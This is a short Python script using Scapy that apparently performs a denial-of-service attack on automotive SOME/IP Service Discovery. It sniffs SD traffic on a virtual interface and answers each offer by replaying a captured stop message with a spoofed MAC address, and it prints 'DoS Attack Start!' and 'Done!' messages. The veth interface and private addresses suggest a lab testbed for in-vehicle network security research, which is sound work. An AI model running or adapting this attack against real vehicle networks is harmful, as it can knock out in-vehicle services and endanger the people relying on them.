from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
import time
from datetime import datetime
import struct
import numpy as np
import pdb

pcaps = rdpcap("../../replay_someipsd_stopoffer.pcap")
stopsub_packet = pcaps[17]

def process_packet(packet):
    global stopsub_packet
    if packet.haslayer(IP) and packet.haslayer(UDP):
        if packet.haslayer(SD):
            packet = stopsub_packet
            print("SOMEIP-SD-Offer DoS Attack Start!")
            packet[Ether].src = '00:00:00:00:00:08'
            packet[SDOption_IP4_EndPoint].port = 42908
            packet = update_udp_chksum(packet)
            sendp(packet, iface='veth0.3')
            print("SOMEIP-SD-Offer DoS Attack Done!")
            time.sleep(3)

filter = "udp and src host 10.0.3.2 and src port 30490 and dst port 30490"
sniff(filter=filter, iface='veth0.3', prn=process_packet)

